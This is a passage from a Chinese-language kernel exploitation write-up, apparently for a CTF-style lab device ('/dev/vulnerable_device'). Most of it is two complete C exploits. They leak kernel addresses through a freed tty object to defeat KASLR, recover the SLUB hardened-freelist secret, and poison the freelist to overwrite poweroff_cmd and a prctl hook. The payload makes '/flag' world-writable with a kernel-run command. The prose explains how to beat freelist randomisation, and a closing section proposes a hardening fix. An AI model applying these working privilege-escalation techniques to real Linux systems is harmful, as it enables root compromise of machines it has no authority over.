    struct Arg{
        int idx;
        int size;
        void *ptr;
    };
    int fd;
    void Add(int idx, int size){
        struct Arg arg;
        arg.idx = idx;
        arg.size = size;
        ioctl(fd, 0xFF01, &arg);
    }
    void Show(int idx, void *buf, int size){
        struct Arg arg;
        arg.idx = idx;
        arg.size = size;
        arg.ptr = buf;
        ioctl(fd, 0xFF02, &arg);
    }
    void Free(int idx){
        struct Arg arg;
        arg.idx = idx;
        ioctl(fd, 0xFF03, &arg);
    }
    void Edit(int idx, void *buf, int size){
        struct Arg arg;
        arg.idx = idx;
        arg.size = size;
        arg.ptr = buf;
        ioctl(fd, 0xFF04, &arg);
    }
    int main(void)
    {
        prctl(0);
        fd = open("/dev/vulnerable_device", O_RDWR);
        printf("%d\n", fd);
        //leak kernel address
        int tty = open("/dev/ptmx", O_RDWR | O_NOCTTY); //alloc tty obj 
        close(tty); //free tty obj
        Add(0, 0x400); //alloc tty obj
        uLL tty_obj[0x10];
        Show(0, &tty_obj, 8*0x10);
        uLL tty_ops_cur = tty_obj[3]; // tty_obj->ops
        printf("tty_ops_cur %p\n", tty_ops_cur);
        uLL tty_ops_nokaslr = 0xffffffff81e6b980;
        LL kaslr = tty_ops_cur - tty_ops_nokaslr;
        printf("kaslr %p\n", kaslr);
        uLL poweroff_work_func = kaslr + 0xffffffff8106ec07;
        printf("poweroff_work_func %p\n", poweroff_work_func);
        uLL poweroff_force = kaslr + 0xffffffff82245140;
        printf("poweroff_cmd %p\n", poweroff_force);
        uLL prctl_hook = kaslr + 0xffffffff822a04a0;
        printf("prctl_hook %p\n", prctl_hook);
        //leak s->random
        Add(0, 0x100);
        Add(1, 0x100);
        Add(2, 0x100);
        uLL H1, H2, H3;
        Show(0, &H1, 8);
        Show(1, &H2, 8);
        Show(2, &H3, 8);
        uLL R;
        if(H1==H3) 
            R = H1^0x100;
        else
            R = H2^0x100;
        printf("R: %p\n", R);
        //get last obj to leak heap addr
        uLL heap_addr = 0;
        int idx = 0;
        while(1){
            Add(idx, 0x100);
            Show(idx, &heap_addr, 8);
            heap_addr^=R;
            if(heap_addr>>(8*6)==0xFFFF)
                break;
            idx = (idx+1)%0x10;
        }
        printf("heap_addr: %p\n", heap_addr);
        printf("idx: %d\n", idx);
        int before = (idx-1+0x10)%0x10; //object before last object
        int next = (idx+1)%0x10;
        //alloc to poweroff_force
        Free(idx);  //freelist->last_obj->...
        uLL *buf=malloc(0x108);
        buf[0x100/8] = poweroff_force^heap_addr^R;
        Edit(before, buf, 0x108); //freelist->last_obj->poweroff_force
        Add(idx, 0x100); //alloc last_obj
        Add(next, 0x100); //alloc to poweroff_force
        char cmd[]="/bin/chmod 777 /flag";
        Edit(next, cmd, strlen(cmd)+1);
        //alloc to prctl_hook
        Free(idx);  //freelist->last_obj->...
        buf[0x100/8] = prctl_hook^heap_addr^R;
        Edit(before, buf, 0x108); //freelist->last_obj->prctl_hook
        Add(idx, 0x100); //alloc last_obj
        Add(next, 0x100); //alloc to prctl_hook
        Edit(next, &poweroff_work_func, 8); 
        //restore freelist to avoid crash
        Free(idx);
        buf[0x100/8] = 0^heap_addr^R;
        Edit(before, buf, 0x108); //freelist->last_obj->NULL
        //trigger
        prctl(0);
    }
## 开启freelist随机化
  * freelist随机化之后不改变其FILO的性质, 因此利用tty泄露内核地址部分仍有效. 但是在后面泄露随机数R的部分, 不再拥有`下一个空闲对象与本对象相邻`这一性质, 这时怎么呢?
  * 假设一个freelist中有n个对象, 每个对象都随机排列. 由于freelist的最后对象由于空闲指针为NULL, 可以直接排除. 因此`一个对象的空闲指针指向后一个对象的概率为1/(n-2)`. 也就是说freelist越短, 我们猜`下一个空闲对象与本对象相邻`的成功率就越高. 由于slub缓存的对象越大freelist就越短, 因此我们申请越大的对象约好
  * 连续申请16个8k的对象结果如下. 对于`kmalloc-8k`这个slub其freelist长度只有4, 猜的话成功率为`1/2`, 并且内核中极少申请这个slub, 其稳定性也很好.
  * 后续寻找到freelist中最后一个对象, 在泄露堆地址后我们需要溢出这个对象的空闲指针, 此时一种思路是随便选择一个对象然后溢出尽可能多的长度, 提高成功率. 另一方面我们可以溢出除此以外的所有对象, 总归可以溢出成功, 以此大大提高成功率.
  * 完整exp如下, 经过测试对于0x2000 0x1000这种size基本3次以内就可成功, 对于0x100的size, 大概10次以内出结果, 成功率还是很高的
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef unsigned long long uLL;
    typedef long long LL;
    struct Arg{
        int idx;
        int size;
        void *ptr;
    };
    int fd;
    void Add(int idx, int size){
        struct Arg arg;
        arg.idx = idx;
        arg.size = size;
        ioctl(fd, 0xFF01, &arg);
    }
    void Show(int idx, void *buf, int size){
        struct Arg arg;
        arg.idx = idx;
        arg.size = size;
        arg.ptr = buf;
        ioctl(fd, 0xFF02, &arg);
    }
    void Free(int idx){
        struct Arg arg;
        arg.idx = idx;
        ioctl(fd, 0xFF03, &arg);
    }
    void Edit(int idx, void *buf, int size){
        struct Arg arg;
        arg.idx = idx;
        arg.size = size;
        arg.ptr = buf;
        ioctl(fd, 0xFF04, &arg);
    }
    #define SIZE 0x100
    int main(void)
    {
        prctl(0);
        fd = open("/dev/vulnerable_device", O_RDWR);
        printf("%d\n", fd);
        //leak kernel address
        int tty = open("/dev/ptmx", O_RDWR | O_NOCTTY); //alloc tty obj 
        close(tty); //free tty obj
        Add(0, 0x400); //alloc tty obj
        uLL tty_obj[0x10];
        Show(0, &tty_obj, 8*0x10);
        uLL tty_ops_cur = tty_obj[3]; // tty_obj->ops
        printf("tty_ops_cur %p\n", tty_ops_cur);
        uLL tty_ops_nokaslr = 0xffffffff81e6b980;
        LL kaslr = tty_ops_cur - tty_ops_nokaslr;
        printf("kaslr %p\n", kaslr);
        uLL poweroff_work_func = kaslr + 0xffffffff8106ec07;
        printf("poweroff_work_func %p\n", poweroff_work_func);
        uLL poweroff_force = kaslr + 0xffffffff82245140;
        printf("poweroff_cmd %p\n", poweroff_force);
        uLL prctl_hook = kaslr + 0xffffffff822a04a0;
        printf("prctl_hook %p\n", prctl_hook);
        //for freelist->A->B, assume A+size=B
        //leak s->random
        Add(0, SIZE);   // get A
        uLL H1;
        Show(0, &H1, 8);
        uLL R = H1^SIZE;
        printf("R: %p\n", R);
        //get last obj to leak heap addr
        uLL heap_addr = 0;
        int idx = 0;
        while(1){
            Add(idx%0x10, SIZE);
            Show(idx%0x10, &heap_addr, 8);
            heap_addr^=R;
            if(heap_addr>>(8*6)==0xFFFF)
                break;
            idx++;
        }
        printf("heap_addr: %p\n", heap_addr);
        printf("idx: %d\n", idx);
        //如果idx超过0x10, 也就是转了一圈, 那么就溢出除了idx以外的所有对象, 成功率为15/freelist长度
        //如果idx没超过0x10, Arr[]保存了一个完整的freelist, 只要溢出idx之前所有的对象, 一定成功
        int limit = idx>0x10 ? 0x10 : idx%0x10;
        idx%= 0x10;
        int next = (idx+1)%0x10;
        //alloc to poweroff_force
        Free(idx);  //freelist->last_obj->...
        uLL *buf=malloc(SIZE+0x8);
        buf[SIZE/8] = poweroff_force^heap_addr^R;
        for(int i=0; ilast_obj->poweroff_force
            if(i!=idx)
                 Edit(i, buf, SIZE+0x8); 
        }
        Add(idx, SIZE); //alloc last_obj
        Add(next, SIZE); //alloc to poweroff_force
        char cmd[]="/bin/chmod 777 /flag";
        Edit(next, cmd, strlen(cmd)+1);
        //alloc to prctl_hook
        Free(idx);  //freelist->last_obj->...
        buf[SIZE/8] = prctl_hook^heap_addr^R;
        for(int i=0; ilast_obj->prctl_hook
            if(i!=idx)
                 Edit(i, buf, SIZE+0x8); 
        }
        Add(idx, SIZE); //alloc last_obj
        Add(next, SIZE); //alloc to prctl_hook
        Edit(next, &poweroff_work_func, 8); 
        //restore freelist to avoid crash
        Free(idx);
        buf[SIZE/8] = 0^heap_addr^R;
        for(int i=0; ilast_obj->NULL
            if(i!=idx)
                 Edit(i, buf, SIZE+0x8); 
        }
        //trigger
        prctl(0);
        system("cat flag");
    }
## 反思与改进
  * 加固指针这个机制的弱点在于没有引起熵的抵消, 导致很容易从输出推测出输入.
  * 原加固过程为`加固指针=空闲指针 ^ 空闲指针地址 ^ 随机数R`. 模仿safelink机制, 我们可以改进为`加固指针=空闲指针 ^ ROR(空闲指针地址, 24) ^ 随机数R`, 主要目的是让`空闲指针的熵`与`空闲指针地址的熵`相互叠加, 而非相互抵消.
  * 从效率上来说, 我感觉freelist随机化是比较鸡肋的, 因为大多数freelist都比较短, 导致随机化程度不够, 倒不如直接去掉这个机制
  * 进一步的, 如果内核堆地址自带随机化的话, 甚至可以直接`加固指针=空闲指针 ^ ROR(空闲指针地址, 24)`, 连随机数R都可以直接忽略, 因为解开
  * 后面准备去github提PR的, 但是发现已经有人提交这个问题了, 晚了一步, 可惜了